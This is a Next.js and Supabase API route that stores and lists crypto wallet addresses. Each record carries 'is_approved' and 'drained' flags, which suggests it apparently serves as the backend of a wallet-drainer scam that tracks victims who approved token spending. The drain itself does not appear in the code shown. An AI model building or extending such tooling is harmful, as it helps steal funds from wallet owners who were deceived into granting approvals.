import { NextRequest, NextResponse } from "next/server";
import { getServiceSupabase } from "@/lib/supabase";
import { isAdminAuthorized } from "@/lib/auth";
import { createClient } from '@supabase/supabase-js';

const supabase = createClient(
  process.env.SUPABASE_URL!,
  process.env.SUPABASE_SERVICE_ROLE_KEY!   // ← This is key
);

// GET - Fetch all wallets (for Admin)

export async function GET(req: NextRequest) {
  if (!(await isAdminAuthorized(req))) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  const supabase = getServiceSupabase(); // ← Must use SERVICE ROLE key here

  const { data, error } = await supabase
    .from("wallets")
    .select("*")
    .order("created_at", { ascending: false });   // ← Get ALL rows, newest first

  if (error) {
    console.error("Supabase fetch error:", error);
    return NextResponse.json({ error: error.message }, { status: 500 });
  }

  return NextResponse.json({ wallets: data || [] });
}

// POST - Record new approval (public)

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    console.log("📥 Received POST body:", body);

    const { address } = body;

    if (!address) {
      console.log("❌ No address provided");
      return NextResponse.json({ error: "Address is required" }, { status: 400 });
    }

    const supabase = getServiceSupabase();
    console.log("✅ Service client created");

    const insertData = {
      address: address.toLowerCase(),
      is_approved: true,
      drained: false,
      connected_at: new Date().toISOString(),
      created_at: new Date().toISOString(),
    };

    console.log("📤 Inserting data:", insertData);

    const { data, error } = await supabase
      .from("wallets")
      .insert(insertData)
      .select()
      .single();

    if (error) {
      console.error("❌ Supabase Insert Error:", error);
      return NextResponse.json({ 
        error: "Failed to save wallet", 
        details: error.message,
        code: error.code 
      }, { status: 500 });
    }

    console.log("✅ Wallet inserted successfully:", data);
    return NextResponse.json({ success: true, data });

  } catch (err: any) {
    console.error("🔥 Server Error in POST:", err);
    return NextResponse.json({ 
      error: "Server error", 
      message: err.message 
    }, { status: 500 });
  }
}